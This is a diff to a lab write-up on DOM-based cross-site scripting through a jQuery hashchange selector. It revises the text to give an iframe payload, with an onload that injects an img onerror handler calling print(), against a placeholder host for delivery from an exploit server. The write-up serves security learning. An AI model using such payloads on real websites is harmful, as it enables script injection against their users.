@@ -12,4 +12,5 @@ $(window).on('hashchange', function(){
   if (post) post.get(0).scrollIntoView();
 });
 ```
-This meant that all that I had to do was submit this payload:```<iframe src="https://vulnerable-website.com#" onload="this.src+='<img src=1 onerror=print("Done")>'"> ``` into
+This means that the ideal payload compromises of:```<iframe src="xyz.com#" onload="this.src+='<img src=1 onerror=print("Done")>'"> ``` where xyz.com is replaced with the link to your lab. 
+Then you should navigate to your exploit server and place the payload into the body. This made the lab complete.
